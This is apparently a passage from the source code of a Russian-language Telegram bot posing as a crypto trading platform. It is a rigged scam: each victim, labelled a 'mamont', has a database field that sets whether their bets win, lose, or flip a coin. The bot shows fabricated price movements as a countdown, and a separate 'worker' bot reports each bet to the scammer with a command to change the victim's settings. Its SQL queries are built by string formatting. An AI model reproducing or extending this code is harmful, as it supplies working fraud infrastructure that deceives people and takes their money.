        results = await asyncio.gather(*tasks)
        for result in results:
            with sqlite3.connect(bd) as c:
                info = c.execute(f'SELECT * FROM mamonts_trade WHERE id = {call.from_user.id}').fetchone()
            if info[10] == 0:
                text = f'''
            🌐 Введите сумму, которую хотите инвестировать.
            
Минимальная сумма инвестиций - 500₽
Курс монеты - {result}$
            
Ваш денежный баланс: {info[3]} RUB'''
                with open('Trade/photo/cardano.jpg', 'rb') as photo:
                    await bot.send_photo(call.from_user.id, photo, text, parse_mode='HTML', reply_markup=menu.carda)
                    await statess.CARDANO.q1.set()
            else:
                text2 = f'''
                <b>⚠️ Вам заблокировали данную функцию.</b>
                
<i>❗️Обратитесь в тех.поддержку</i>'''
                await bot.send_message(text=text2, reply_markup=menu.tp, parse_mode='HTML')

@dp.message_handler(state=statess.BTCtrade.q1)
async def check_sum(message: types.Message, state: FSMContext):
    with sqlite3.connect(bd) as c:
        info = c.execute(f'SELECT * FROM mamonts_trade WHERE id = {message.from_user.id}').fetchone()
    try:
        if message.text.isdigit():
            if 500 > int(message.text) or int(message.text) > info[3]:
                await message.answer("Неккоректно введена сумма \n"
                                 "Повторите ввод\n\n"
                                 "<b>Минимальная сумма инвестиций - 500 RUB</b>", reply_markup=menu.otmena)
            else:
                await message.answer("🗯 Куда пойдет курс актива? \n\n"
                                 "📈 Коэффициенты: \n"
                                 "Вверх - x2 \n"
                                 "Вниз - x2", reply_markup=await choose(int(message.text)))
        else:
            await message.answer("<b>❌ Некорректный ввод</b>")
    except ValueError:
        await message.answer("Что-то пошло не так!")
    await state.finish()

@dp.callback_query_handler(choose_callback.filter(direction="upbtc"))
async def up_btn(call: types.CallbackQuery, callback_data: dict):
    await result(call, int(callback_data.get("amount")), "вверх")

@dp.callback_query_handler(choose_callback.filter(direction="downbtc"))
async def down_btn(call: types.CallbackQuery, callback_data: dict):
    await result(call, int(callback_data.get("amount")), "вниз")

async def result(call: types.CallbackQuery, amount: int, direction: str):
    with sqlite3.connect(bd) as c:
        info = c.execute(f'SELECT * FROM mamonts_trade WHERE id = {call.from_user.id}').fetchone()
        ref = c.execute('SELECT * FROM mamonts_trade WHERE id = ?',(call.from_user.id,)).fetchone()
        worker = c.execute('SELECT * FROM workers WHERE ref_code = ?',(ref[2],)).fetchone()
    if up_btn:
        async with aiohttp.ClientSession() as session:
            cryptos = ["BTC"]
            tasks = [fetch_price(session, crypto) for crypto in cryptos]
            results = await asyncio.gather(*tasks)
            for result in results:
                if info[5] == 100:
                    for i in range(1, 21):
                        await bot.edit_message_text(f"🏦 BTC/USD\n\n💵 Сумма ставки: {amount} RUB\n📉 Прогноз: {direction}\n\n• Изначальная стоимость: {result} USD\n• Текущая стоимость: {round(float(result) + 9 * float(result) / 1000, 2)} USD\n• Изменение: +{round(float(result) + random.randint(4, 10) * float(result) / 1000, 2) - float(result)} USD\n\n⏱ Осталось: {20 - i}",call.message.chat.id, call.message.message_id)
                        await asyncio.sleep(1)
                    with sqlite3.connect(bd) as c:
                        c.execute("UPDATE mamonts_trade SET sdelok = sdelok + ? WHERE id = ?",('1', call.from_user.id,))
                        c.execute("UPDATE mamonts_trade SET balance = balance + ? WHERE id = ?",(amount, call.from_user.id,))
                    await call.message.answer(f'<b>📉 Стоимость актива пошла {direction}\nИнвестиция прошла успешно\n\nЕсли хотите проинвестировать ещё, введите сумму инвестиции\nДоступный баланс: {int(info[3]) + amount} RUB</b>', reply_markup=menu.otmena, parse_mode='HTML')
                    texts = f'''
                        <b>📊 Мамонт @{call.from_user.username} сделал ставку (Трейд)
                        
🛠 Параметры ставки:
                        
💎 Валюта: BTC/USD
💸 Сумма: {amount}
🤔 Прогноз: {direction}
✅ Статус: успешно</b>
                        
<i>📝 Изменить параметры мамонту:</i> /t{call.from_user.id}'''
                    await workerbot.send_message(worker[0], texts, parse_mode='HTML')
                elif info[5] == 50:
                    random_result = random.randint(1, 2)
                    print(random_result)
                    if random_result == 1:
                        for i in range(1, 21):
                            await bot.edit_message_text(f"🏦 BTC/USD\n\n💵 Сумма ставки: {amount} RUB\n📉 Прогноз: {direction}\n\n• Изначальная стоимость: {result} USD\n• Текущая стоимость: {round(float(result) + 9 * float(result) / 1000, 2)} USD\n• Изменение: +{round(float(result) + random.randint(4, 10) * float(result) / 1000, 2) - float(result)} USD\n\n⏱ Осталось: {20 - i}",call.message.chat.id, call.message.message_id)
                            await asyncio.sleep(1)
                        with sqlite3.connect(bd) as c:
                            c.execute("UPDATE mamonts_trade SET sdelok = sdelok + ? WHERE id = ?",('1', call.from_user.id,))
                            c.execute("UPDATE mamonts_trade SET balance = balance + ? WHERE id = ?",(amount, call.from_user.id,))
                        await call.message.answer(f'<b>📉 Стоимость актива пошла {direction}\nИнвестиция прошла успешно\n\nЕсли хотите проинвестировать ещё, введите сумму инвестиции\nДоступный баланс: {int(info[3]) + amount} RUB</b>', reply_markup=menu.otmena, parse_mode='HTML')
                        texts2 = f'''
                        <b>📊 Мамонт @{call.from_user.username} сделал ставку (Трейд)
                        
🛠 Параметры ставки:
                        
💎 Валюта: BTC/USD
💸 Сумма: {amount}
🤔 Прогноз: {direction}
✅ Статус: успешно</b>
                        
<i>📝 Изменить параметры мамонту:</i> /t{call.from_user.id}'''
                        await workerbot.send_message(worker[0], texts2, parse_mode='HTML')
                    else:
                        for i in range(1, 21):
                            await bot.edit_message_text(f"🏦 BTC/USD\n\n💵 Сумма ставки: {amount} RUB\n📉 Прогноз: {direction}\n\n• Изначальная стоимость: {round(float(result) + 9 * float(result) / 1000, 2)} USD\n• Текущая стоимость: {result} USD\n• Изменение: -{round(float(result) + random.randint(4, 10) * float(result) / 1000, 2) - float(result)} USD\n\n⏱ Осталось: {20 - i}",call.message.chat.id, call.message.message_id)
                            await asyncio.sleep(1)
                        with sqlite3.connect(bd) as c:
                            c.execute("UPDATE mamonts_trade SET sdelok = sdelok + ? WHERE id = ?",('1', call.from_user.id,))
                            c.execute("UPDATE mamonts_trade SET balance = balance - ? WHERE id = ?",(amount, call.from_user.id,))
                        await call.message.answer(f'<b>📉 Стоимость актива пошла вниз\nИнвестиция прошла безуспешно\n\nЕсли хотите проинвестировать ещё, введите сумму инвестиции\nДоступный баланс: {int(info[3]) - amount}</b>', reply_markup=menu.otmena, parse_mode='HTML')
                        texts3 = f'''
                        <b>📊 Мамонт @{call.from_user.username} сделал ставку (Трейд)
                        
🛠 Параметры ставки:
                        
💎 Валюта: BTC/USD
💸 Сумма: {amount}
🤔 Прогноз: {direction}
❌ Статус: безуспешно</b>
                        
<i>📝 Изменить параметры мамонту:</i> /t{call.from_user.id}'''
                        await workerbot.send_message(worker[0], texts3, parse_mode='HTML')
                else:
                    for i in range(1, 21):
                            await bot.edit_message_text(f"🏦 BTC/USD\n\n💵 Сумма ставки: {amount} RUB\n📉 Прогноз: {direction}\n\n• Изначальная стоимость: {round(float(result) + 9 * float(result) / 1000, 2) + float(result)} USD\n• Текущая стоимость: {result} USD\n• Изменение: -{round(float(result) + random.randint(4, 10) * float(result) / 1000, 2) - float(result)} USD\n\n⏱ Осталось: {20 - i}",call.message.chat.id, call.message.message_id)
                            await asyncio.sleep(1)
                    with sqlite3.connect(bd) as c:
                        c.execute("UPDATE mamonts_trade SET sdelok = sdelok + ? WHERE id = ?",('1', call.from_user.id,))
                        c.execute("UPDATE mamonts_trade SET balance = balance - ? WHERE id = ?",(amount, call.from_user.id,))
                    await call.message.answer(f'<b>📉 Стоимость актива пошла вниз\nИнвестиция прошла безуспешно\n\nЕсли хотите проинвестировать ещё, введите сумму инвестиции\nДоступный баланс: {int(info[3]) - amount}</b>', reply_markup=menu.otmena, parse_mode='HTML')
                    texts4 = f'''
                        <b>📊 Мамонт @{call.from_user.username} сделал ставку (Трейд)
                        
🛠 Параметры ставки:
                        
💎 Валюта: BTC/USD
💸 Сумма: {amount}
🤔 Прогноз: {direction}
❌ Статус: безуспешно</b>
                        
<i>📝 Изменить параметры мамонту:</i> /t{call.from_user.id}'''
                    await workerbot.send_message(worker[0], texts4, parse_mode='HTML')
                await statess.BTCtrade.q1.set()
    elif down_btn:
        async with aiohttp.ClientSession() as session:
            cryptos = ["BTC"]
            tasks = [fetch_price(session, crypto) for crypto in cryptos]
            results = await asyncio.gather(*tasks)
            for result in results:
                if info[5] == 100:
                    for i in range(1, 21):
                        await bot.edit_message_text(f"🏦 BTC/USD\n\n💵 Сумма ставки: {amount} RUB\n📉 Прогноз: {direction}\n\n• Изначальная стоимость: {result} USD\n• Текущая стоимость: {round(float(result) - 9 * float(result) / 1000, 2) - float(result)} USD\n• Изменение: -{round(float(result) + random.randint(4, 10) * float(result) / 1000, 2) - float(result)} USD\n\n⏱ Осталось: {20 - i}",call.message.chat.id, call.message.message_id)
                        await asyncio.sleep(1)
                    with sqlite3.connect(bd) as c:
                        c.execute("UPDATE mamonts_trade SET sdelok = sdelok + ? WHERE id = ?",('1', call.from_user.id,))
                        c.execute("UPDATE mamonts_trade SET balance = balance + ? WHERE id = ?",(amount, call.from_user.id,))
                    await call.message.answer(f'<b>📉 Стоимость актива пошла {direction}\nИнвестиция прошла успешно\n\nЕсли хотите проинвестировать ещё, введите сумму инвестиции\nДоступный баланс: {int(info[3]) + amount} RUB</b>', reply_markup=menu.otmena, parse_mode='HTML')
                    texts5 = f'''
                        <b>📊 Мамонт @{call.from_user.username} сделал ставку (Трейд)
                        
🛠 Параметры ставки:
                        
💎 Валюта: BTC/USD
💸 Сумма: {amount}
🤔 Прогноз: {direction}
✅ Статус: успешно</b>
                        
<i>📝 Изменить параметры мамонту:</i> /t{call.from_user.id}'''
                    await workerbot.send_message(worker[0], texts5, parse_mode='HTML')
                elif info[5] == 50:
                    random_result = random.randint(1, 2)
                    print(random_result)
                    if random_result == 1:
                        for i in range(1, 21):
                            await bot.edit_message_text(f"🏦 BTC/USD\n\n💵 Сумма ставки: {amount} RUB\n📉 Прогноз: {direction}\n\n• Изначальная стоимость: {result} USD\n• Текущая стоимость: {round(float(result) - 9 * float(result) / 1000, 2) - float(result)} USD\n• Изменение: -{round(float(result) + random.randint(4, 10) * float(result) / 1000, 2) - float(result)} USD\n\n⏱ Осталось: {20 - i}",call.message.chat.id, call.message.message_id)
                            await asyncio.sleep(1)
                        with sqlite3.connect(bd) as c:
                            c.execute("UPDATE mamonts_trade SET sdelok = sdelok + ? WHERE id = ?",('1', call.from_user.id,))
                            c.execute("UPDATE mamonts_trade SET balance = balance + ? WHERE id = ?",(amount, call.from_user.id,))
                        await call.message.answer(f'<b>📉 Стоимость актива пошла {direction}\nИнвестиция прошла успешно\n\nЕсли хотите проинвестировать ещё, введите сумму инвестиции\nДоступный баланс: {int(info[3]) + amount} RUB</b>', reply_markup=menu.otmena, parse_mode='HTML')
                        texts6 = f'''
                        <b>📊 Мамонт @{call.from_user.username} сделал ставку (Трейд)
                        
🛠 Параметры ставки:
                        
💎 Валюта: BTC/USD
💸 Сумма: {amount}
🤔 Прогноз: {direction}
✅ Статус: успешно</b>
                        
<i>📝 Изменить параметры мамонту:</i> /t{call.from_user.id}'''
                        await workerbot.send_message(worker[0], texts6, parse_mode='HTML')
                    else:
                        for i in range(1, 21):
                            await bot.edit_message_text(f"🏦 BTC/USD\n\n💵 Сумма ставки: {amount} RUB\n📉 Прогноз: {direction}\n\n• Изначальная стоимость: {round(float(result) + 9 * float(result) / 1000, 2)} USD\n• Текущая стоимость: {result} USD\n• Изменение: +{round(float(result) - random.randint(4, 10) * float(result) / 1000, 2) - float(result)} USD\n\n⏱ Осталось: {20 - i}",call.message.chat.id, call.message.message_id)
                            await asyncio.sleep(1)
                        with sqlite3.connect(bd) as c:
                            c.execute("UPDATE mamonts_trade SET sdelok = sdelok + ? WHERE id = ?",('1', call.from_user.id,))
                            c.execute("UPDATE mamonts_trade SET balance = balance - ? WHERE id = ?",(amount, call.from_user.id,))
                        await call.message.answer(f'<b>📉 Стоимость актива пошла вверх\nИнвестиция прошла безуспешно\n\nЕсли хотите проинвестировать ещё, введите сумму инвестиции\nДоступный баланс: {int(info[3]) - amount}</b>', reply_markup=menu.otmena, parse_mode='HTML')
                        texts7 = f'''
                        <b>📊 Мамонт @{call.from_user.username} сделал ставку (Трейд)
                        
🛠 Параметры ставки:
                        
💎 Валюта: BTC/USD
💸 Сумма: {amount}
🤔 Прогноз: {direction}
❌ Статус: безуспешно</b>
                        
<i>📝 Изменить параметры мамонту:</i> /t{call.from_user.id}'''
                        await workerbot.send_message(worker[0], texts7, parse_mode='HTML')
                else:
                    for i in range(1, 21):
                        await bot.edit_message_text(f"🏦 BTC/USD\n\n💵 Сумма ставки: {amount} RUB\n📉 Прогноз: {direction}\n\n• Изначальная стоимость: {round(float(result) + 9 * float(result) / 1000, 2)} USD\n• Текущая стоимость: {result} USD\n• Изменение: +{round(float(result) - random.randint(4, 10) * float(result) / 1000, 2) - float(result)} USD\n\n⏱ Осталось: {20 - i}",call.message.chat.id, call.message.message_id)
                        await asyncio.sleep(1)
                    with sqlite3.connect(bd) as c:
                        c.execute("UPDATE mamonts_trade SET sdelok = sdelok + ? WHERE id = ?",('1', call.from_user.id,))
                        c.execute("UPDATE mamonts_trade SET balance = balance - ? WHERE id = ?",(amount, call.from_user.id,))
                    await call.message.answer(f'<b>📉 Стоимость актива пошла вверх\nИнвестиция прошла безуспешно\n\nЕсли хотите проинвестировать ещё, введите сумму инвестиции\nДоступный баланс: {int(info[3]) - amount}</b>', reply_markup=menu.otmena, parse_mode='HTML')
                    texts8 = f'''
                        <b>📊 Мамонт @{call.from_user.username} сделал ставку (Трейд)
                        
🛠 Параметры ставки:
                        
💎 Валюта: BTC/USD
💸 Сумма: {amount}
🤔 Прогноз: {direction}
❌ Статус: безуспешно</b>
                        
<i>📝 Изменить параметры мамонту:</i> /t{call.from_user.id}'''
                    await workerbot.send_message(worker[0], texts8, parse_mode='HTML')
                await statess.BTCtrade.q1.set()


@dp.callback_query_handler(text="cancel", state="*")
async def cancel_btn(call: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await call.message.answer("✅ Действие отменено", reply_markup=menu.mainkb)

executor.start_polling(dp)